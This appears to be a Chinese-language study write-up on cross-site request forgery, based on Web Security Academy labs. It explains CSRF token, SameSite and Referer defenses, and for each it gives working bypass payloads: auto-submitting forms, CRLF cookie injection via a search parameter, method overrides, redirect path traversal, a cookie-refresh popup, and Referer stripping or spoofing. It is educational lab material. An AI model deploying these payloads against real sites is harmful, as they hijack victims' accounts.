跨站请求伪造（也称为CSRF，Cross-site request forgery）是一种网络安全漏洞，允许攻击者诱使用户执行他们不打算执行的行为。它允许攻击者部分规避相同的源头策略，该策略旨在防止不同网站相互干扰。 CSRF需要3个条件：

  • 一个相关的行动。在应用中，攻击者有理由诱导某个动作。这可能是特权作（例如修改其他用户的权限）或对用户特定数据的任何作（例如更改用户自己的密码）。
  • 基于Cookie的会话处理。CSRF通常以基于cookie的会话处理为基础来描述，但它也出现在应用程序自动为请求添加某些用户凭证的情境中，如HTTP Basic认证和基于证书的认证。
  • 没有不可预测的请求参数。

无防御的 CSRF 漏洞#

如果一个应用程序包含一个功能，允许用户更改账户中的电子邮件地址，且该过程符合CSRF的3个要求。攻击者可以构建包含以下HTML的网页：

 1<html>
 2    <body>
 3        <form action="https://vulnerable-website.com/email/change" method="POST">
 4            <input type="hidden" name="email" value="pwned@evil-user.net" />
 5        </form>
 6        <script>
 7            document.forms[0].submit();
 8        </script>
 9    </body>
10</html>

如果受害者用户访问攻击者的网页，攻击者的页面会触发对受攻击网站的HTTP请求。如果用户登录了易受攻击的网站，其浏览器会自动在请求中包含会话Cookie。受攻击的网站会以正常方式处理请求，视为受害用户发出，并更改其电子邮件地址。

要快速利用CSRF漏洞，可以使用Burp的右键“参与度工具”->“CSRF PoC”。

例如，对于这样一个没有防御措施的CSRF漏洞，完全可以在更改邮件地址的时候抓包，生成利用漏洞的html。当然，需要勾选“包括自动提交脚本”选项，并将更新后的邮件地址改一下即可。

绕过 CSRF 令牌验证#

防御CSRF攻击最有效的方法是在相关请求中包含CSRF令牌。该令牌必须满足以下条件：

  • 高熵时，这种不可预测性，就像会话令牌一样。
  • 绑定在用户会话。
  • 在执行相关操作前，在每种情况下都经过严格验证。

CSRF 令牌应被视为机密，并在整个生命周期内以安全方式处理。一种通常有效的方法是通过POST方法提交的HTML表单中的隐藏字段内将令牌传输给客户端。随后，该令牌将在表单提交时作为请求参数包含：

1<input type="hidden" name="csrf-token" value="CIwNZNlR4XbisJF39I8yWnWX9wX4WFoz" />

为了进一步安全，包含CSRF令牌的字段应尽早放置在HTML文档中，理想情况下应放在任何非隐藏输入字段之前，以及HTML中嵌入用户可控制数据的位置之前。另一种方法是将令牌放入 URL 查询字符串中，安全性较差。

依赖于请求方法#

有些应用程序在请求使用 POST 方法时正确验证令牌，但使用 GET 方法时跳过验证。在这种情况下，攻击者可以切换到GET方法绕过验证，发动CSRF攻击：

1GET /email/change?email=pwned@evil-user.net HTTP/1.1
2Host: vulnerable-website.com
3Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm

例如，在更改邮件地址的时候，可以更改请求方法为GET之后，再生成CSRF PoC进行攻击。

依赖于令牌的存在#

有些应用程序在令牌存在时会正确验证，但如果遗漏令牌则跳过验证。

例如，在更改邮件地址的时候，直接删除csrf参数。

不绑定用户会话#

有些程序不会验证令牌是否属于发送请求的用户的同一个会话。相反，应用维护一个其已发行的全局令牌池，并接受该池中出现的任何令牌。于是，可以用自己的账户登录应用，获取有效的令牌，然后将该令牌传递给受害者用户进行CSRF攻击。

例如，分别登录两个账户之后，对其中一个抓包。记录其csrf值之后丢弃。然后抓包另一个账户，覆盖csrf值并生成PoC。

绑定在非会话 cookie 上#

当应用采用两个不同的框架时，很容易发生CSRF令牌绑定到一个Cookie上，但不绑定用于跟踪会话的同一个Cookie的情况。一个用于会话处理，另一个用于CSRF保护，且两者未集成。比如：

1POST /email/change HTTP/1.1
2Host: vulnerable-website.com
3Content-Type: application/x-www-form-urlencoded
4Content-Length: 68
5Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv
6
7csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com

其中，Cookie中的csrfKey值就与csrf令牌关联，但不与Cookie本身关联。于是，可以将攻击者账户的csrfKey值与csrf值完整覆盖第1个用户的，从而实现CSRF攻击。

例如，将第2个账户的两个值都覆盖第1个账户之后，需要在CSRF PoC中进行调整。将自动提交的<script>标签，稍作更改，添加crsfKey：

1<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None" onerror="document.forms[0].submit()">

这里是因为search对应的搜索功能没有 CSRF 保护，所以可以使用它来将 cookie 注入受害者用户的浏览器。

Cookie 中重复令牌#

有些应用程序不维护任何已发出的令牌的服务器端记录，而是在 cookie 和请求参数中复制每个令牌。当后续请求被验证时，应用程序只需验证请求参数中提交的令牌是否与 cookie 提交的值相符。这有时被称为针对CSRF的“双重提交”防御，因其易于实现且无需任何服务器端状态而被推荐：

1POST /email/change HTTP/1.1
2Host: vulnerable-website.com
3Content-Type: application/x-www-form-urlencoded
4Content-Length: 68
5Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa
6
7csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com

只要攻击者能够将设置被害者的Cookie，就可以通过让Cookie中的csrf值和外部的令牌相同而成功攻击。

例如，将csrf值全部改为fake，于是，将生成的PoC中“自动提交”的<script>标签改为：

1<img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>

再更改邮箱地址后，放入攻击服务器中即可。

绕过SameSite cookie限制#

SameSite是一种浏览器安全机制，用于控制浏览器在跨站请求（即请求的来源与目标站点不同）时是否发送该 Cookie。通过在 Cookie 中设置 SameSite 属性，服务器可以声明该 Cookie 是否应被附加到跨站请求中，从而增强 Web 应用的安全性。

[!note] 在 Cookie 的 SameSite 机制中，“同一站点”（Same-site）是根据 站点（site）来判定的，而不是根据源（origin）。判定规则：

  • 比较两个 URL 的 协议（scheme） 是否相同（例如 https:// 和 http://）。
  • 比较两个 URL 的 有效顶级域名（如 .com、.co.uk 等） + 一级域名（eTLD+1） 是否相同。
  • 如果 协议相同 且 eTLD+1 相同，则视为同一站点；否则视为跨站（cross-site）。 例如：
请求来源 请求去向 同站？ 同源？
https://example.com https://example.com 是 是
https://app.example.com https://intranet.example.com 是 不，域名不匹配
https://example.com https://example.com:8080 是 不，端口不匹配
https://example.com https://example.co.uk 不，eTLD不匹配 不，域名不匹配
https://example.com http://example.com 不，协议不匹配 不，协议不匹配

SameSite有3个级别，分别如下：

值 行为描述 适用场景示例
Strict 最严格：Cookie 仅在同一站点（即请求的站点与 Cookie 的域名完全一致）的请求中发送。所有跨站请求均不发送 银行交易、个人设置页等高度敏感的操作。用户必须先在当前站点内点击链接或提交表单才能保持登录
Lax 中等：在跨站请求中，仅允许安全的顶级导航（如点击链接、GET 表单提交）发送 Cookie，这既允许从外部链接进入网站时保持登录，又能防止跨站 POST 攻击 大部分网站的会话 Cookie。用户从搜索引擎点击链接进入主页时仍可保持登录，但跨站的 POST 操作会被阻断
None 无限制：所有跨站请求都会发送 Cookie（包括第三方嵌入的请求）。但设置 SameSite=None 时必须同时指定 Secure 属性，SameSite=None; Secure，即 Cookie 只能通过 HTTPS 发送，否则浏览器会拒绝 需要跨站携带 Cookie 的场景，如单点登录（SSO）、嵌入第三方服务的 widget 等

GET方法绕过 Lax#

即使普通的 GET 请求不被Lax允许，一些框架也提供了覆盖请求行中指定的方法的方式。例如，Symfony 支持表单中的 _method 参数，该参数在路由时优先于普通方法：

1<form action="https://vulnerable-website.com/account/transfer-payment" method="GET">
2    <input type="hidden" name="_method" value="POST">
3    <input type="hidden" name="recipient" value="hacker">
4    <input type="hidden" name="amount" value="1000000">
5</form>

例如，在登录的 POST /login 页面，没有发现响应的 Set-Cookie 参数中对 SameSite 有专门设置，那大概率就是默认的Lax级别。在更改电子邮件地址页面，直接将 POST 方法强行改为 GET 方法是不行的。于是，有两种具体的实施思路。一个是，在网址后面紧跟 _method，即 &_method=POST 。然后生成 PoC 即可。另一个是，就用 GET 方法不变，更改 PoC 。更改后的结果如上所示。

重定向绕过 Strict#

例如，在 login 页面中已经发现，响应的 Set-Cookie 参数中设置了 SameSite=Strict。于是，考虑客户端的重定向绕过。发表评论成功之后，发现 /post/comment/confirmation?postId=x 网址被重定向到了之前的博客页面。仔细查看，发现是有一个js文件根据 postId 参数进行的重定向。于是，进行路径遍历，直到重定向到已登录的账户页面。发现路径遍历的结果是 /post/comment/confirmation?postId=1/../../my-account 。在漏洞服务器中尝试下面的payload，发现确实出现了已登录的账户页面：

1<script>
2    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=../my-account";
3</script>

这说明，浏览器在第二个请求中包含了已验证的会话 cookie。第1个请求是从漏洞服务器到 /post/comment/confirmation?postId=1 ，属于跨站请求；第2个请求是到 /my-account ，属于同站请求。接着查看修改邮件地址的页面，把 POST 方法更改为 GET 方法居然能够成功。于是，直接构造payload进行攻击：

1<script>
2    document.location = "https://YOUR-LAB-ID.web-security-academy.net/post/comment/confirmation?postId=1/../../my-account/change-email?email=pwned%40web-security-academy.net%26submit=1";
3</script>

这里为了避免干扰 postId 参数解析，对 & 进行了 URL 编码。

cookie 刷新绕过 Lax#

如前所述，如果网站在设置 cookie 时未包含 SameSite 属性，Chrome 默认会自动应用 Lax 限制。然而，为了避免破坏单点登录 (SSO) 机制，它实际上不会对顶级 POST 请求在最初的 120 秒强制执行这些限制。因此，用户可能在两分钟的时间窗口内容易受到跨站攻击。但是，在2分钟内完成所有攻击有点仓促。于是，有两种思路。一个是，如果能在网站上找到一个小工具，强制受害者获取新的会话cookie，那就可以在进行主要攻击之前提前刷新他们的cookie。例如，完成基于OAuth的登录流程可能每次都会产生一个新的会话，因为OAuth服务不一定知道用户是否仍然登录到目标网站。让用户离开当前页面去 OAuth 登录，完成后再返回，但这样会打断攻击流程，且需要用户配合返回。另一个是，从新标签页触发Cookie刷新，这样浏览器就不会在发动最终攻击前离开页面。但是，这个弹窗默认会被浏览器屏蔽：

1window.open('https://vulnerable-website.com/login/sso');

为了绕过这个问题，可以用事件处理程序onclick将语句包装如下：

1window.onclick = () => { window.open('https://vulnerable-website.com/login/sso'); }

例如，对于使用 OAuth 流程登录账号，发现更改电子邮件的页面没有 csrf 令牌，这就可能受到攻击。登录的2分钟内，用普通的 PoC 放在漏洞利用服务器中，发现确实能够更改邮件地址。这说明时间窗口的存在，攻击者需要刷新会话以重置窗口。然后，利用 /social-login 刷新会话。 /social-login 会自动启动OAuth流程，即使用户已登录，也会重新认证并设置新的会话Cookie。于是，采用下面的payload：

 1<form method="POST" action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
 2    <input type="hidden" name="email" value="pwned@portswigger.net">
 3</form>
 4<p>Click anywhere on the page</p>
 5<script>
 6    window.onclick = () => {
 7        window.open('https://YOUR-LAB-ID.web-security-academy.net/social-login');
 8        setTimeout(changeEmail, 5000);
 9    }
10
11    function changeEmail() {
12        document.forms[0].submit();
13    }
14</script>

查看漏洞利用效果时，点击任意一处即可触发。

绕过基于Referer的CSRF防御#

除了使用 CSRF 令牌的防御之外，一些应用程序还会使用 HTTP Referer 头来尝试防御 CSRF 攻击，通常通过验证请求是否来自应用程序自己的域。这种方法通常效果较差，并且经常容易被绕过。

Referer的验证依赖于头部的存在#

一些应用程序在请求中存在 Referer 头时会验证它，但如果省略该头则跳过验证。在这种情况下，攻击者可以以某种方式构造他们的 CSRF 利用，使受害用户的浏览器在生成的请求中丢弃 Referer 头。实现这一点的方法有很多，但最简单的方法是在托管 CSRF 攻击的 HTML 页面中使用 META 标签：

1<meta name="referrer" content="never">

例如，在更改电子邮件地址的页面，发现改动 Referer 头，请求会被拒绝，但是删除又会被接受。所以，在生成的 PoC 中添加上面的META标签即可。

Referer验证失效#

一些应用程序以一种简单粗暴的方式验证 Referer 头，这种方式可能被绕过。例如，如果应用程序验证 Referer 中的域名以预期值开头，攻击者就可以将其作为自己域名的子域名放置。同样，如果应用程序只是验证 Referer 是否包含其自身的域名，攻击者就可以在 URL 的其他位置放置所需的值：

1http://attacker-website.com/csrf-attack?vulnerable-website.com

但是，许多浏览器现在默认会从 Referer 头中去掉查询字符串。可以通过确保包含漏洞利用的响应设置了 Referrer-Policy: unsafe-url 头来覆盖此行为。这将确保发送完整的 URL，包括查询字符串。

例如，在更改邮件地址的页面，发现网站能够接受任何包含有预期域名的 Referer 头。比如：

1Referer: https://incorrect.net?YOUR-LAB-ID.web-security-academy.net

这样能够被接受。于是，在生成的 PoC 中修改一处：

1<script>
2history.pushState('', '', '/?YOUR-LAB-ID.web-security-academy.net');
3</script>

这里的 history.pushState() 是在不刷新页面的情况下改变浏览器地址栏的 URL。但是，因为许多浏览器现在默认会从Referer头中移除查询字符串以作为安全措施。所以，为了覆盖此行为并确保请求中包含完整URL，还需要在漏洞利用服务器的“头部”里添加 Referrer-Policy: unsafe-url 头。
